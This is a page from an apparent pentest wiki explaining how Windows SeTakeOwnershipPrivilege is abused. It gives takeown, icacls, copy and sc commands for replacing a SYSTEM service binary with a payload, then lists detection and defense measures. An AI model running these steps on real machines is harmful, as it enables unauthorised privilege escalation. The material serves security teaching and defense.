# SeTakeOwnership Abuse

`SeTakeOwnershipPrivilege` allows a token to **take ownership of any securable object** without being granted access first. Once you own an object you can rewrite its DACL to grant yourself full control — so this privilege is an indirect arbitrary-write: take ownership of a file a SYSTEM service runs (or a sensitive registry key), grant yourself write, replace it with a payload, and trigger it.

## Confirm the privilege

```cmd
whoami /priv | findstr /i "SeTakeOwnership"
```

## Exploitation

Pick a target that SYSTEM executes — a service binary, a scheduled-task program, or a DLL in a privileged load path. Example: hijack a service executable.

1. Take ownership of the target file:

```cmd
takeown /f "C:\Program Files\Vuln Service\service.exe"
```

2. Grant your user full control:

```cmd
icacls "C:\Program Files\Vuln Service\service.exe" /grant %USERNAME%:F
```

3. Replace it with your payload and restart the service (or wait for reboot):

```cmd
copy /y C:\Windows\Temp\payload.exe "C:\Program Files\Vuln Service\service.exe"
sc stop VulnService & sc start VulnService
```

A frequently-used variant targets a file executed at SYSTEM logon or a DLL loaded by a privileged process rather than a service binary — the primitive is identical: own → grant → overwrite → trigger.

## Detection and defenses

- **Detection:** `takeown`/`icacls` against files outside a user's profile, ownership changes on service binaries (audit object access), a service binary changing hash then restarting.
- **Defenses:** restrict `SeTakeOwnershipPrivilege`; monitor ownership/DACL changes on tier-0 paths; keep service directories non-writable.

## Related
- [Token Privilege Abuse](Token-Privilege-Abuse.md) — hub mapping every dangerous privilege
- [Services Exploitation](../Services-Exploitation/Services-Exploitation.md) — the service-binary target and restart mechanics
- [Insecure File Permissions Service Executable Files Path](../Services-Exploitation/Insecure-File-Permissions-Service-Executable-Files-Path.md) — the ACL-based cousin of this technique
- [Dynamic Link Library Hijacking(DLL Hijacking)](../Services-Exploitation/Dynamic-Link-Library-Hijacking(DLL-Hijacking).md) — alternative overwrite target
